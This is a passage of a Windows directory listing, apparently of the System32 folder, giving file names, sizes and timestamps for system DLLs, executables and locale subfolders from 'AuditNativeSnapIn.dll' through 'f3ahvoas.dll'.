09/15/2018  09:13 AM           219,136 AuditNativeSnapIn.dll
09/15/2018  09:12 AM            28,672 auditpol.exe
09/15/2018  09:12 AM            55,296 auditpolcore.dll
09/15/2018  09:13 AM            57,344 AuditPolicyGPInterop.dll
09/15/2018  09:13 AM            95,744 auditpolmsg.dll
09/15/2018  09:13 AM           162,304 AuthBroker.dll
09/15/2018  09:13 AM            87,040 AuthBrokerUI.dll
09/15/2018  09:13 AM            53,760 AuthExt.dll
09/15/2018  09:12 AM           361,984 authfwcfg.dll
09/15/2018  09:13 AM           300,032 AuthFWGP.dll
09/15/2018  09:13 AM         5,107,200 AuthFWSnapin.dll
09/15/2018  09:13 AM           112,640 AuthFWWizFwk.dll
09/15/2018  09:13 AM           420,864 authui.dll
09/15/2018  09:12 AM           185,856 authz.dll
09/15/2018  09:11 AM           871,424 autochk.exe
09/15/2018  09:11 AM           852,480 autoconv.exe
09/15/2018  09:11 AM           830,976 autofmt.exe
09/15/2018  09:13 AM           149,504 autoplay.dll
09/15/2018  09:13 AM            69,632 avicap32.dll
09/15/2018  09:13 AM            96,768 avifil32.dll
09/15/2018  09:12 AM            27,328 avrt.dll
09/15/2018  09:13 AM            41,587 azman.msc
09/15/2018  09:13 AM           779,776 azroles.dll
09/15/2018  09:13 AM           324,608 azroleui.dll
09/15/2018  09:13 AM            25,088 AzSqlExt.dll
09/07/2019  02:20 AM         1,370,624 AzureSettingSyncProvider.dll
09/15/2018  09:13 AM            54,272 BackgroundMediaPolicy.dll
09/15/2018  09:13 AM            17,720 backgroundTaskHost.exe
09/15/2018  09:13 AM            34,304 BackgroundTransferHost.exe
09/15/2018  09:13 AM            12,288 BamSettingsClient.dll
09/15/2018  09:13 AM           180,536 basecsp.dll
09/15/2018  09:13 AM         1,661,952 batmeter.dll
09/15/2018  09:13 AM           130,560 bcastdvr.proxy.dll
09/15/2018  09:13 AM            80,896 BcastDVRBroker.dll
09/15/2018  09:13 AM           371,712 BcastDVRClient.dll
09/15/2018  09:13 AM           180,224 BcastDVRCommon.dll
09/15/2018  09:11 AM           104,984 bcd.dll
09/15/2018  09:11 AM           279,416 BCP47Langs.dll
09/15/2018  09:11 AM           112,256 BCP47mrm.dll
09/15/2018  09:12 AM            96,760 bcrypt.dll
09/07/2019  02:20 AM           398,928 bcryptprimitives.dll
09/15/2018  09:13 AM            76,800 bdaplgin.ax
04/13/2025  06:54 PM    <DIR>          BestPractices
09/15/2018  11:06 AM    <DIR>          bg-BG
09/15/2018  09:14 AM            52,736 bidispl.dll
09/07/2019  02:20 AM         7,251,456 BingMaps.dll
09/07/2019  02:20 AM           723,968 BingOnlineServices.dll
09/07/2019  02:20 AM           275,456 BioCredProv.dll
09/07/2019  02:20 AM           143,360 BitLockerCsp.dll
09/15/2018  09:13 AM           181,760 bitsadmin.exe
09/15/2018  09:12 AM            25,088 bitsperf.dll
09/15/2018  09:12 AM            47,616 BitsProxy.dll
09/15/2018  09:13 AM           277,840 biwinrt.dll
09/15/2018  09:13 AM           143,360 BluetoothApis.dll
09/15/2018  09:13 AM         3,170,304 boot.sdi
09/15/2018  09:12 AM            82,432 bootcfg.exe
09/15/2018  09:12 AM            24,072 BOOTVID.DLL
09/15/2018  09:13 AM            22,984 bopomofo.uce
09/15/2018  09:13 AM            43,008 browcli.dll
09/15/2018  09:13 AM            11,776 browseui.dll
09/15/2018  09:19 AM    <DIR>          Bthprops
09/15/2018  09:13 AM           217,600 bthprops.cpl
09/15/2018  09:13 AM            26,624 BthTelemetry.dll
09/15/2018  09:13 AM            37,888 bthudtask.exe
09/15/2018  09:13 AM           114,176 btpanui.dll
09/15/2018  09:13 AM            53,248 BWContextHandler.dll
09/15/2018  09:13 AM            50,176 ByteCodeGenerator.exe
09/15/2018  09:12 AM            69,120 cabapi.dll
09/15/2018  09:12 AM           119,800 cabinet.dll
09/15/2018  09:13 AM           151,040 cabview.dll
09/15/2018  09:11 AM            27,648 cacls.exe
09/15/2018  09:13 AM            26,112 calc.exe
09/15/2018  09:13 AM            65,536 CallButtons.dll
09/15/2018  09:13 AM            17,920 CallButtons.ProxyStub.dll
09/15/2018  09:13 AM           144,384 CallHistoryClient.dll
09/15/2018  09:13 AM            94,720 CameraCaptureUI.dll
09/15/2018  09:12 AM            29,056 CameraSettingsUIHost.exe
09/15/2018  09:13 AM            28,160 canonurl.dll
09/15/2018  09:13 AM            71,680 CapabilityAccessManagerClient.dll
09/15/2018  09:13 AM           269,136 capauthz.dll
09/15/2018  09:13 AM            53,248 capiprovider.dll
09/15/2018  09:12 AM            20,992 capisp.dll
09/07/2019  02:20 AM           134,144 CastingShellExt.dll
09/15/2018  09:19 AM    <DIR>          catroot
09/15/2018  09:13 AM           387,072 catsrv.dll
09/15/2018  09:13 AM            24,064 catsrvps.dll
09/15/2018  09:13 AM           410,624 catsrvut.dll
09/15/2018  09:11 AM            24,064 cbclient.dll
09/15/2018  09:13 AM            71,168 cca.dll
09/15/2018  09:13 AM           841,728 cdosys.dll
09/07/2019  02:20 AM         3,427,328 cdp.dll
09/07/2019  02:20 AM         1,223,168 cdprt.dll
09/15/2018  09:13 AM           201,728 cemapi.dll
09/15/2018  09:13 AM           430,592 certadm.dll
09/15/2018  09:13 AM           649,728 certca.dll
09/15/2018  09:13 AM           346,624 certcli.dll
09/15/2018  09:12 AM           320,000 certCredProvider.dll
09/15/2018  09:13 AM            54,272 certenc.dll
09/15/2018  09:13 AM         2,839,040 CertEnroll.dll
09/15/2018  09:13 AM            42,496 CertEnrollCtrl.exe
09/15/2018  09:13 AM           287,744 CertEnrollUI.dll
09/15/2018  09:13 AM            63,081 certlm.msc
09/15/2018  09:13 AM         1,958,400 certmgr.dll
09/15/2018  09:13 AM            63,070 certmgr.msc
09/15/2018  09:13 AM           641,536 certocm.dll
09/15/2018  09:14 AM            19,456 certpick.dll
09/15/2018  09:13 AM            50,176 CertPKICmdlet.dll
09/15/2018  09:13 AM           105,984 CertPolEng.dll
09/15/2018  09:12 AM           428,544 certreq.exe
09/15/2018  09:13 AM         1,270,784 certutil.exe
09/15/2018  09:12 AM           233,984 cewmdm.dll
09/15/2018  09:11 AM            63,488 cfgbkend.dll
09/15/2018  09:12 AM           235,496 cfgmgr32.dll
09/15/2018  09:13 AM            34,816 cfmifs.dll
09/15/2018  09:13 AM            11,264 cfmifsproxy.dll
09/07/2019  02:20 AM         6,065,664 Chakra.dll
09/07/2019  02:20 AM           117,248 Chakradiag.dll
09/15/2018  09:13 AM           105,472 Chakrathunk.dll
09/15/2018  09:11 AM            14,848 change.exe
09/15/2018  09:13 AM           172,544 charmap.exe
09/15/2018  09:11 AM           105,984 chartv.dll
09/15/2018  09:13 AM           558,080 ChatApis.dll
09/15/2018  09:11 AM            12,800 chcp.com
09/15/2018  09:12 AM            26,112 CheckNetIsolation.exe
09/15/2018  09:11 AM            19,456 chglogon.exe
09/15/2018  09:11 AM            20,992 chgport.exe
09/15/2018  09:11 AM            19,456 chgusr.exe
09/15/2018  09:11 AM            23,040 chkdsk.exe
09/15/2018  09:11 AM            19,456 chkntfs.exe
09/15/2018  09:11 AM            28,160 choice.exe
09/15/2018  09:13 AM           167,640 chs_singlechar_pinyin.dat
09/15/2018  09:12 AM            10,752 CHxReadingStringIME.dll
09/15/2018  09:13 AM           157,696 cic.dll
09/15/2018  09:11 AM            39,936 cipher.exe
09/15/2018  09:13 AM            32,256 CIWmi.dll
09/15/2018  09:13 AM            14,848 clb.dll
09/15/2018  09:13 AM           515,624 clbcatq.dll
09/15/2018  09:13 AM            92,672 cldapi.dll
09/15/2018  09:13 AM           211,456 cleanmgr.exe
09/15/2018  09:11 AM            59,392 clfsw32.dll
09/15/2018  09:12 AM            78,336 cliconfg.dll
09/15/2018  09:12 AM            28,672 cliconfg.exe
09/15/2018  09:12 AM            37,376 cliconfg.rll
09/15/2018  09:11 AM            24,576 clip.exe
09/15/2018  09:13 AM           163,840 ClipboardServer.dll
09/15/2018  09:13 AM           124,960 Clipc.dll
09/15/2018  09:13 AM           791,864 CloudExperienceHostCommon.dll
09/15/2018  09:13 AM           185,656 CloudExperienceHostUser.dll
09/15/2018  09:11 AM            13,312 clrhost.dll
09/07/2019  02:20 AM           793,600 clusapi.dll
09/15/2018  09:13 AM            32,256 cmcfg32.dll
09/07/2019  02:20 AM           236,032 cmd.exe
09/15/2018  09:11 AM            19,968 cmdext.dll
09/15/2018  09:13 AM           492,032 cmdial32.dll
09/15/2018  09:12 AM            17,408 cmdkey.exe
09/15/2018  09:13 AM            46,592 cmdl32.exe
09/15/2018  09:13 AM            30,208 cmgrcspps.dll
09/15/2018  09:13 AM            86,032 cmifw.dll
09/07/2019  02:20 AM            29,696 cmintegrator.dll
09/15/2018  09:13 AM            35,328 cmlua.dll
09/15/2018  09:13 AM            36,352 cmmon32.exe
09/15/2018  09:13 AM            24,064 cmpbk32.dll
09/15/2018  09:13 AM            81,920 cmstp.exe
09/15/2018  09:13 AM            16,896 cmstplua.dll
09/15/2018  09:13 AM            45,568 cmutil.dll
09/15/2018  09:12 AM           104,448 cngcredui.dll
04/13/2025  06:54 PM            11,264 cngkeyhelper.dll
09/15/2018  09:13 AM            55,808 cngprovider.dll
09/15/2018  09:11 AM            34,304 cnvfat.dll
09/15/2018  09:13 AM            68,608 colbact.dll
09/15/2018  09:13 AM            34,816 coloradapterclient.dll
09/15/2018  09:12 AM           184,064 COLORCNV.DLL
09/15/2018  09:13 AM            86,528 colorcpl.exe
09/15/2018  09:13 AM           600,576 colorui.dll
09/15/2018  11:06 AM    <DIR>          com
09/07/2019  02:20 AM         2,593,032 combase.dll
09/15/2018  09:13 AM             8,192 comcat.dll
09/15/2018  09:12 AM           569,856 comctl32.dll
09/07/2019  02:20 AM           993,792 comdlg32.dll
09/15/2018  09:13 AM           124,118 comexp.msc
09/07/2019  02:20 AM           373,768 coml2.dll
09/15/2018  09:11 AM            23,552 comp.exe
09/15/2018  09:11 AM            40,448 compact.exe
09/15/2018  09:13 AM           113,256 compmgmt.msc
09/15/2018  09:13 AM             8,960 compobj.dll
09/07/2019  02:20 AM           152,576 ComposableShellProxyStub.dll
09/07/2019  02:20 AM            91,424 CompPkgSup.dll
09/15/2018  09:13 AM           288,768 compstui.dll
09/07/2019  02:20 AM            66,048 ComputerDefaults.exe
09/15/2018  09:13 AM           114,176 comrepl.dll
09/15/2018  09:13 AM             2,560 comres.dll
09/15/2018  09:13 AM           231,936 comsnap.dll
09/15/2018  09:13 AM         1,346,560 comsvcs.dll
09/15/2018  09:13 AM           614,400 comuid.dll
09/27/2019  08:04 PM           250,136 concrt140.dll
09/15/2018  09:19 AM    <DIR>          config
09/15/2018  09:13 AM            48,128 ConfigureExpandedStorage.dll
09/15/2018  09:13 AM         1,291,776 connect.dll
09/15/2018  09:13 AM            49,664 ConnectedAccountState.dll
09/15/2018  09:13 AM           109,568 console.dll
09/15/2018  09:14 AM           250,880 ConsoleLogon.dll
09/15/2018  09:13 AM            47,104 ContactActivation.dll
09/15/2018  09:13 AM           971,776 ContactApis.dll
09/07/2019  02:20 AM           151,040 container.dll
09/15/2018  09:12 AM           114,688 control.exe
09/15/2018  09:11 AM            19,456 convert.exe
09/07/2019  02:20 AM           582,240 CoreMessaging.dll
09/15/2018  09:12 AM            19,968 CoreMmRes.dll
09/15/2018  09:13 AM           329,216 CoreShellAPI.dll
09/15/2018  09:13 AM         2,538,768 CoreUIComponents.dll
09/15/2018  09:13 AM           218,624 Cortana.Persona.dll
09/15/2018  09:13 AM           194,048 CortanaMapiHelper.dll
09/15/2018  09:13 AM            11,776 CortanaMapiHelper.ProxyStub.dll
09/07/2019  02:20 AM           690,688 CPFilters.dll
09/15/2018  09:13 AM           109,488 CredentialUIBroker.exe
09/15/2018  09:13 AM            80,384 CredProv2faHelper.dll
09/15/2018  09:13 AM           475,648 CredProvDataModel.dll
09/15/2018  09:13 AM            65,536 CredProvHelper.dll
09/07/2019  02:20 AM           280,576 credprovhost.dll
09/15/2018  09:13 AM           263,168 credprovs.dll
09/15/2018  09:13 AM           158,208 credprovslegacy.dll
09/15/2018  09:13 AM            19,456 credssp.dll
09/07/2019  02:20 AM            35,840 credui.dll
09/15/2018  09:13 AM            29,696 credwiz.exe
09/15/2018  09:13 AM           149,019 crtdll.dll
09/15/2018  09:12 AM         1,668,784 crypt32.dll
09/15/2018  09:12 AM            31,728 cryptbase.dll
09/15/2018  09:13 AM            26,112 cryptdlg.dll
09/07/2019  02:20 AM            55,792 cryptdll.dll
09/15/2018  09:13 AM            60,416 cryptext.dll
09/15/2018  09:12 AM           135,680 cryptnet.dll
09/07/2019  02:20 AM           322,048 cryptngc.dll
09/15/2018  09:12 AM           282,624 CryptoWinRT.dll
09/15/2018  09:12 AM            67,648 cryptsp.dll
09/15/2018  09:12 AM            45,056 crypttpmeksvc.dll
09/15/2018  09:12 AM           548,864 cryptui.dll
09/15/2018  09:12 AM           365,056 cryptuiwizard.dll
09/15/2018  09:12 AM            98,592 cryptxml.dll
09/15/2018  11:06 AM    <DIR>          cs-CZ
09/07/2019  02:20 AM            40,960 cscapi.dll
09/07/2019  02:20 AM            22,016 cscdll.dll
09/07/2019  02:20 AM           203,264 cscobj.dll
09/15/2018  09:13 AM           145,408 cscript.exe
09/15/2018  09:12 AM             9,728 ctfmon.exe
09/15/2018  09:13 AM            27,136 ctl3d32.dll
09/15/2018  09:13 AM           311,296 cttune.exe
09/15/2018  09:13 AM            35,328 cttunesvr.exe
09/07/2019  02:20 AM           386,048 curl.exe
09/15/2018  09:13 AM           224,768 C_G18030.DLL
09/15/2018  09:13 AM            12,288 c_GSM7.DLL
09/15/2018  09:13 AM            13,824 C_IS2022.DLL
09/15/2018  09:13 AM            12,288 C_ISCII.DLL
09/15/2018  09:13 AM         5,309,288 d2d1.dll
09/15/2018  09:13 AM         1,046,016 d3d10.dll
09/15/2018  09:13 AM            33,792 d3d10core.dll
09/15/2018  09:13 AM           333,568 d3d10level9.dll
09/07/2019  02:20 AM         5,915,936 d3d10warp.dll
09/15/2018  09:13 AM           151,552 d3d10_1.dll
09/15/2018  09:13 AM            34,304 d3d10_1core.dll
09/15/2018  09:13 AM         2,264,344 d3d11.dll
09/15/2018  09:13 AM           439,976 d3d11on12.dll
09/07/2019  02:20 AM         1,458,056 D3D12.dll
09/15/2018  09:13 AM           698,880 d3d8.dll
09/15/2018  09:12 AM            12,800 d3d8thk.dll
09/15/2018  09:12 AM         1,495,248 d3d9.dll
09/15/2018  09:13 AM           537,088 d3d9on12.dll
09/15/2018  09:12 AM         3,689,984 D3DCompiler_47.dll
09/15/2018  09:13 AM           319,488 d3dim.dll
09/15/2018  09:13 AM           386,560 d3dim700.dll
09/15/2018  09:13 AM           595,456 d3dramp.dll
09/15/2018  09:13 AM           113,152 D3DSCache.dll
09/15/2018  09:13 AM            56,832 d3dxof.dll
09/15/2018  11:06 AM    <DIR>          da-DK
09/15/2018  09:12 AM             8,704 dabapi.dll
09/15/2018  09:13 AM            88,576 DafPrintProvider.dll
09/15/2018  09:13 AM           266,240 DaOtpCredentialProvider.dll
09/07/2019  02:20 AM            36,352 dataclen.dll
09/15/2018  09:13 AM           297,472 DataExchange.dll
04/13/2025  07:11 PM            78,336 davclnt.dll
09/15/2018  09:11 AM            22,016 davhlpr.dll
09/07/2019  02:20 AM           425,472 daxexec.dll
09/15/2018  09:12 AM           132,096 dbgcore.dll
09/07/2019  02:20 AM         5,130,752 dbgeng.dll
09/15/2018  09:12 AM         1,522,176 dbghelp.dll
09/15/2018  09:12 AM           500,224 DbgModel.dll
09/15/2018  09:12 AM           104,960 dbnetlib.dll
09/15/2018  09:12 AM            19,456 dbnmpntw.dll
09/15/2018  09:13 AM           641,024 dccw.exe
09/15/2018  09:12 AM            50,176 dcgpofix.exe
09/15/2018  09:12 AM            11,776 dciman32.dll
09/15/2018  09:13 AM            10,240 dcomcnfg.exe
09/07/2019  02:20 AM         1,427,592 dcomp.dll
09/15/2018  09:13 AM            25,600 DDACLSys.dll
09/15/2018  09:13 AM           159,232 ddisplay.dll
09/15/2018  09:13 AM            32,256 ddodiag.exe
09/15/2018  09:13 AM            13,824 DDOIProxy.dll
09/15/2018  09:13 AM            41,488 DDORes.dll
09/15/2018  09:13 AM           529,408 ddraw.dll
09/15/2018  09:13 AM            41,984 ddrawex.dll
09/15/2018  11:06 AM    <DIR>          de-DE
09/15/2018  09:13 AM               366 DefaultAccountTile.png
09/15/2018  09:13 AM            18,784 DefaultDeviceManager.dll
09/15/2018  09:13 AM            21,504 DefaultPrinterProvider.dll
09/15/2018  09:11 AM            19,968 delegatorprovider.dll
09/15/2018  09:13 AM           165,888 desk.cpl
09/15/2018  09:13 AM            34,816 DesktopShellAppStateContract.dll
09/15/2018  09:13 AM           101,736 DevDispItemProvider.dll
09/15/2018  09:13 AM            81,712 devenum.dll
09/15/2018  09:13 AM           176,328 deviceaccess.dll
09/15/2018  09:13 AM            45,424 deviceassociation.dll
09/15/2018  09:13 AM           401,920 DeviceCenter.dll
09/15/2018  09:13 AM            48,640 DeviceCredential.dll
09/15/2018  09:13 AM            28,672 DeviceDisplayStatusManager.dll
09/15/2018  09:13 AM         1,693,696 DeviceFlows.DataModel.dll
09/15/2018  09:13 AM           153,088 devicengccredprov.dll
09/15/2018  09:13 AM           500,224 DevicePairing.dll
09/15/2018  09:13 AM           198,144 DevicePairingFolder.dll
09/15/2018  09:13 AM            23,552 DevicePairingProxy.dll
09/15/2018  09:13 AM            82,944 DevicePairingWizard.exe
09/15/2018  09:13 AM            68,096 DeviceReactivation.dll
09/15/2018  09:13 AM            28,672 DeviceSetupStatusProvider.dll
09/15/2018  09:13 AM            12,288 DeviceUxRes.dll
09/15/2018  09:13 AM           145,622 devmgmt.msc
09/15/2018  09:13 AM           757,760 devmgr.dll
09/15/2018  09:12 AM           135,304 devobj.dll
09/15/2018  09:12 AM            50,688 devrtl.dll
09/15/2018  09:13 AM           560,640 dfrgui.exe
09/15/2018  09:12 AM            44,032 dfscli.dll
09/15/2018  09:11 AM         1,178,112 dfshim.dll
09/15/2018  09:13 AM            54,784 DfsShlEx.dll
09/15/2018  09:12 AM            12,288 dhcpcmonitor.dll
09/07/2019  02:20 AM           325,120 dhcpcore.dll
09/07/2019  02:20 AM           264,704 dhcpcore6.dll
09/15/2018  09:12 AM            69,120 dhcpcsvc.dll
09/15/2018  09:12 AM            58,368 dhcpcsvc6.dll
09/15/2018  09:12 AM           138,240 dhcpsapi.dll
09/15/2018  09:13 AM            74,752 DiagnosticInvoker.dll
09/15/2018  09:13 AM           172,544 dialclient.dll
09/15/2018  09:13 AM            32,256 dialer.exe
09/15/2018  09:13 AM           353,792 DictationManager.dll
09/15/2018  09:13 AM           349,184 difxapi.dll
09/15/2018  09:13 AM            35,840 dimsjob.dll
09/15/2018  09:13 AM            39,424 dimsroam.dll
09/15/2018  09:13 AM           135,680 dinput.dll
09/15/2018  09:13 AM           173,568 dinput8.dll
09/15/2018  09:13 AM            20,480 Direct2DDesktop.dll
09/07/2019  02:20 AM           515,960 directmanipulation.dll
09/15/2018  09:13 AM         1,587,200 directml.dll
09/15/2018  09:13 AM            47,682 diskmgmt.msc
09/15/2018  09:11 AM           150,528 diskpart.exe
09/15/2018  09:12 AM            20,992 diskperf.exe
09/15/2018  09:14 AM           306,688 diskshadow.exe
09/07/2019  02:22 AM    <DIR>          Dism
09/15/2018  09:12 AM           231,224 Dism.exe
09/15/2018  09:12 AM           766,264 DismApi.dll
09/15/2018  09:13 AM           264,704 DispBroker.dll
09/15/2018  09:13 AM            16,896 dispex.dll
09/15/2018  09:13 AM           136,704 Display.dll
09/07/2019  02:20 AM           122,368 DisplayManager.dll
09/15/2018  09:12 AM            19,256 dllhost.exe
09/15/2018  09:13 AM            10,752 dllhst3g.exe
09/15/2018  09:13 AM           235,520 dlnashext.dll
09/15/2018  09:13 AM             7,680 DMAlertListener.ProxyStub.dll
09/15/2018  09:13 AM             2,560 DMAppsRes.dll
09/15/2018  09:13 AM            33,792 dmband.dll
09/15/2018  09:13 AM            98,304 dmcfgutils.dll
09/15/2018  09:13 AM           121,848 dmcmnutils.dll
09/15/2018  09:13 AM            11,776 dmcommandlineutils.dll
09/15/2018  09:13 AM            74,240 dmcompos.dll
09/15/2018  09:13 AM           402,432 dmdlgs.dll
09/15/2018  09:13 AM           211,968 dmdskmgr.dll
09/15/2018  09:13 AM         1,064,960 dmdskres.dll
09/15/2018  09:13 AM             2,560 dmdskres2.dll
09/07/2019  02:20 AM           461,824 dmenrollengine.dll
09/15/2018  09:13 AM           199,168 dmime.dll
09/15/2018  09:13 AM            24,064 dmintf.dll
09/15/2018  09:13 AM            11,776 dmiso8601utils.dll
09/15/2018  09:13 AM            41,472 dmloader.dll
09/15/2018  09:13 AM            44,544 dmocx.dll
09/15/2018  09:13 AM            25,088 dmoleaututils.dll
09/15/2018  09:13 AM            25,600 dmprocessxmlfiltered.dll
09/15/2018  09:13 AM            13,312 dmpushproxy.dll
09/15/2018  09:13 AM         1,989,120 DMRCDecoder.dll
09/15/2018  09:13 AM            97,792 dmscript.dll
09/15/2018  09:13 AM           117,760 dmstyle.dll
09/15/2018  09:13 AM           112,128 dmsynth.dll
09/15/2018  09:13 AM           110,080 dmusic.dll
09/15/2018  09:13 AM            21,504 dmutil.dll
09/07/2019  02:20 AM           151,040 dmvdsitf.dll
09/15/2018  09:13 AM           111,104 dmview.ocx
09/15/2018  09:13 AM            72,704 dmxmlhelputils.dll
09/07/2019  02:20 AM           580,024 dnsapi.dll
09/15/2018  09:13 AM           125,952 dnscmmc.dll
09/15/2018  09:13 AM            35,328 docprop.dll
09/15/2018  09:11 AM            16,384 doskey.exe
09/15/2018  09:13 AM            87,552 dot3api.dll
09/15/2018  09:13 AM            60,928 dot3cfg.dll
09/15/2018  09:13 AM            47,616 dot3dlg.dll
09/15/2018  09:13 AM            47,616 dot3gpclnt.dll
09/15/2018  09:13 AM           238,592 dot3gpui.dll
09/15/2018  09:13 AM            57,856 dot3hc.dll
09/15/2018  09:13 AM            87,552 dot3msm.dll
09/15/2018  09:13 AM           289,792 dot3ui.dll
09/15/2018  09:19 AM    <DIR>          downlevel
09/15/2018  09:12 AM            13,312 dpapi.dll
09/15/2018  09:12 AM            73,216 dpapimig.exe
09/15/2018  09:13 AM            48,640 dpapiprovider.dll
09/15/2018  09:13 AM            77,312 DpiScaling.exe
09/15/2018  09:13 AM             8,192 dplaysvr.exe
09/15/2018  09:13 AM             8,192 dplayx.dll
09/15/2018  09:13 AM             8,192 dpmodemx.dll
09/15/2018  09:13 AM             8,192 dpnaddr.dll
09/15/2018  09:13 AM             8,192 dpnathlp.dll
09/15/2018  09:13 AM             8,192 dpnet.dll
09/15/2018  09:13 AM             8,192 dpnhpast.dll
09/15/2018  09:13 AM             8,192 dpnhupnp.dll
09/15/2018  09:13 AM             8,192 dpnlobby.dll
09/15/2018  09:13 AM             8,192 dpnsvr.exe
09/15/2018  09:13 AM             8,192 dpwsockx.dll
09/15/2018  09:11 AM           468,280 dpx.dll
09/15/2018  09:13 AM            35,328 DragDropExperienceDataExchangeDelegated.dll
09/15/2018  09:11 AM            66,560 driverquery.exe
09/15/2018  11:06 AM    <DIR>          drivers
09/15/2018  11:06 AM    <DIR>          DriverStore
09/15/2018  09:13 AM            20,480 drprov.dll
09/07/2019  02:20 AM            91,136 drvsetup.dll
09/07/2019  02:20 AM           974,352 drvstore.dll
09/15/2018  09:12 AM            38,912 dsauth.dll
09/15/2018  09:13 AM           140,288 DscCoreConfProv.dll
09/15/2018  09:13 AM            41,808 dsclient.dll
09/15/2018  09:13 AM           186,880 dsdmo.dll
09/15/2018  09:13 AM           103,424 dskquota.dll
09/15/2018  09:13 AM           188,928 dskquoui.dll
09/07/2019  02:20 AM           497,664 dsound.dll
09/15/2018  09:12 AM            24,064 dsparse.dll
09/15/2018  09:12 AM           143,872 dsprop.dll
09/15/2018  09:13 AM           410,624 dsquery.dll
09/15/2018  09:13 AM           625,152 dsreg.dll
09/15/2018  09:12 AM            24,288 dsrole.dll
09/15/2018  09:16 AM           215,943 dssec.dat
09/15/2018  09:12 AM            48,640 dssec.dll
09/15/2018  09:12 AM           134,280 dssenh.dll
09/15/2018  09:13 AM           128,512 Dsui.dll
09/15/2018  09:12 AM           672,256 dsuiext.dll
09/15/2018  09:13 AM            23,040 dswave.dll
09/07/2019  02:20 AM            80,384 dtdump.exe
09/15/2018  09:13 AM            30,720 dtsh.dll
09/15/2018  09:13 AM         1,474,560 dui70.dll
09/15/2018  09:13 AM           473,600 duser.dll
09/15/2018  09:13 AM            10,240 dvdplay.exe
09/07/2019  02:20 AM           140,088 dwmapi.dll
09/07/2019  02:20 AM         3,096,576 dwmcore.dll
09/07/2019  02:20 AM         2,645,504 DWrite.dll
09/07/2019  02:20 AM           180,736 DWWIN.EXE
09/07/2019  02:20 AM           314,368 dxdiag.exe
09/15/2018  09:13 AM           308,224 dxdiagn.dll
09/15/2018  09:13 AM           661,096 dxgi.dll
09/15/2018  09:13 AM           857,600 dxilconv.dll
09/15/2018  11:06 AM             5,632 dxmasf.dll
09/15/2018  09:13 AM         1,388,544 DxpTaskSync.dll
09/15/2018  09:13 AM           398,848 dxtmsft.dll
09/15/2018  09:13 AM           268,288 dxtrans.dll
09/15/2018  09:13 AM           107,408 dxva2.dll
09/15/2018  09:14 AM           158,208 eapa3hst.dll
09/15/2018  09:14 AM            86,016 eapacfg.dll
09/15/2018  09:14 AM           161,792 eapahost.dll
09/15/2018  09:13 AM           238,080 eapp3hst.dll
09/15/2018  09:13 AM           197,632 eappcfg.dll
09/15/2018  09:13 AM            90,112 eappgnui.dll
09/15/2018  09:13 AM           230,912 eapphost.dll
09/15/2018  09:13 AM            55,808 eappprxy.dll
09/15/2018  09:13 AM            44,032 eapprovp.dll
09/15/2018  09:13 AM           116,736 eapsimextdesktop.dll
09/15/2018  09:13 AM           297,472 EaseOfAccessDialog.exe
09/15/2018  09:13 AM           142,336 easwrt.dll
09/07/2019  02:20 AM        20,817,408 edgehtml.dll
09/07/2019  02:20 AM           330,752 edgeIso.dll
09/07/2019  02:20 AM           663,040 EdgeManager.dll
09/15/2018  09:13 AM            66,560 EditBufferTestHook.dll
09/15/2018  09:13 AM           181,248 EditionUpgradeHelper.dll
09/07/2019  02:20 AM           219,448 EditionUpgradeManagerObj.dll
09/15/2018  09:13 AM           104,448 edpauditapi.dll
09/15/2018  09:13 AM            48,640 edpnotify.exe
09/15/2018  09:13 AM           233,984 edputil.dll
09/15/2018  09:13 AM           108,544 efsadu.dll
09/15/2018  09:12 AM            53,248 efsext.dll
09/15/2018  09:13 AM            12,288 efsui.exe
09/15/2018  09:12 AM            35,840 efsutil.dll
09/15/2018  09:13 AM           545,792 efswrt.dll
09/15/2018  09:13 AM           115,712 EhStorAPI.dll
09/15/2018  09:13 AM           119,808 EhStorAuthn.exe
09/15/2018  09:13 AM           105,984 EhStorPwdMgr.dll
09/15/2018  11:06 AM    <DIR>          el-GR
09/15/2018  09:13 AM           178,688 els.dll
09/15/2018  09:13 AM            61,952 ELSCore.dll
09/15/2018  09:13 AM            12,800 elsext.dll
09/15/2018  09:13 AM           191,488 elshyph.dll
09/15/2018  09:13 AM           590,848 elslad.dll
09/15/2018  09:13 AM            24,576 elsTrans.dll
09/15/2018  09:13 AM           807,424 EmailApis.dll
09/15/2018  09:13 AM            35,840 embeddedmodesvcapi.dll
09/15/2018  11:06 AM    <DIR>          en
09/15/2018  11:06 AM    <DIR>          en-GB
04/13/2025  06:56 PM    <DIR>          en-US
09/15/2018  09:13 AM            21,504 encapi.dll
09/15/2018  09:12 AM            93,952 EncDump.dll
09/15/2018  09:13 AM           186,880 enrollmentapi.dll
09/15/2018  09:13 AM            16,384 EnterpriseAppMgmtClient.dll
09/15/2018  09:13 AM            66,560 enterpriseresourcemanager.dll
09/15/2018  09:13 AM            70,656 eqossnap.dll
09/15/2018  09:13 AM           161,280 ErrorDetails.dll
09/15/2018  09:13 AM            37,888 ErrorDetailsCore.dll
09/15/2018  11:06 AM    <DIR>          es-ES
09/15/2018  11:06 AM    <DIR>          es-MX
09/15/2018  09:13 AM           335,360 es.dll
09/07/2019  02:21 AM           105,984 EscMigPlugin.dll
09/07/2019  02:21 AM            70,144 escUnattend.exe
09/15/2018  09:13 AM            16,896 EsdSip.dll
09/07/2019  02:20 AM         2,928,640 esent.dll
09/15/2018  09:12 AM            61,440 esentprf.dll
09/07/2019  02:20 AM           331,264 esentutl.exe
09/15/2018  09:12 AM            33,792 esevss.dll
09/15/2018  11:06 AM    <DIR>          et-EE
09/15/2018  09:13 AM           154,112 ETWCoreUIComponentsResources.dll
09/15/2018  09:12 AM            78,848 ETWESEProviderResources.dll
09/15/2018  09:13 AM            40,448 EtwRundown.dll
09/15/2018  09:13 AM           303,616 eudcedit.exe
09/15/2018  09:11 AM            14,848 eventcls.dll
09/15/2018  09:12 AM            33,792 eventcreate.exe
09/15/2018  09:13 AM            17,935 EventViewer_EventDetails.xsl
09/15/2018  09:13 AM            81,408 eventvwr.exe
09/15/2018  09:13 AM           145,127 eventvwr.msc
09/15/2018  09:12 AM           636,512 evr.dll
09/15/2018  09:13 AM           239,664 ExecModelClient.dll
09/15/2018  09:13 AM            45,568 execmodelproxy.dll
09/15/2018  09:13 AM            52,736 expand.exe
09/07/2019  02:20 AM         3,821,728 explorer.exe
09/07/2019  02:20 AM         4,344,832 ExplorerFrame.dll
09/15/2018  09:13 AM           380,957 expsrv.dll
09/15/2018  09:13 AM           212,992 ExSMime.dll
09/15/2018  09:13 AM            29,184 extrac32.exe
09/15/2018  09:13 AM            18,944 ExtrasXmlParser.dll
09/15/2018  09:13 AM             8,704 f3ahvoas.dll
